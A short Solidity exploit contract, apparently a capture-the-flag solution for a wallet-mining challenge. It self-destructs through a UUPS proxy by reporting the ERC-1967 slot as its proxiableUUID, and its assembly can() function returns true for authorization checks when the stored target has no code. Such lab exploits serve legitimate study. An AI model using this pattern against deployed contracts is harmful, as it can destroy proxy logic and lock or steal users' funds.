// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract AttackWalletMining {
    function attack() public {
        selfdestruct(payable(address(0)));
    }

    function proxiableUUID() external pure returns (bytes32) {
        return
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    // TODO(0xth3g450pt1m1z0r) put some comments
    function can(address u, address a) public view returns (bool) {
        assembly {
            let m := sload(0)
            if iszero(extcodesize(m)) {
                return(0, 0)
            }
            let p := mload(0x40)
            mstore(0x40, add(p, 0x44))
            mstore(p, shl(0xe0, 0x4538c4eb))
            mstore(add(p, 0x04), u)
            mstore(add(p, 0x24), a)
            if iszero(staticcall(gas(), m, p, 0x44, p, 0x20)) {
                return(0, 0)
            }
            if and(not(iszero(returndatasize())), iszero(mload(p))) {
                return(0, 0)
            }
        }
        return true;
    }
}
